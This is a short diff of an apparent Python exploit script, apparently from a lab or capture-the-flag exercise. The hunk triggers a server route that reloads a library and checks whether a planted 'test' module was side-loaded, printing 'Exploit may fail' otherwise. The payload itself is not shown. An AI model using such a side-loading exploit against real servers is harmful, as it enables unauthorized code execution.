@@ -41,6 +41,11 @@ try:
     # This route triggers importlib.reload(future.standard_library)
     response = requests.get(f"{BASE_URL}/sync-ingredients")
     print(f"[+] Server response: {response.text}")
+    if "Side-loaded module detected!" in response.text:
+        print("[+] SUCCESS: Server confirmed 'test' module was side-loaded!")
+    else:
+        print("[-] WARNING: Server did not confirm 'test' module side-loading. Exploit may fail.")
+    time.sleep(2) # Give it time to write the file
 except Exception as e:
     print(f"[-] Error during triggering: {e}")
 
